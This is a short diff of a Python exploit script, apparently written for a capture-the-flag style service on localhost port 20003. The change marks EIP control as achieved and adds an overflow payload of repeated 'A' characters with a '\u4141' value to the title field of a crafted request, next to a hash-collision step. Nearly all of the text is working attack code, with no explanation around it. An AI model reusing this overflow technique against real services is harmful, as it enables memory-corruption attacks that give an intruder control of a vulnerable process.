@@ -2,7 +2,7 @@
 # exploit by @vnico
 # current status:
 # partial collision hash: OK
-# EIP: KO
+# EIP: OK 
 # http://vnico.mundodisco.net
 import socket
 from struct import pack
@@ -29,6 +29,8 @@ def collide(token, dict_request):
 HOST = '127.0.0.1'
 PORT = 20003
 DICT_REQUEST = { 'title': 'title', 'contents': 'contents', 'tags': ['tag1', 'tag2'], 'serverip': '127.0.0.1' }
+DICT_REQUEST['title'] = 'A' * 127 + '\u4141' + 'A'*1024
+
 print '[*] Connecting to service...'
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
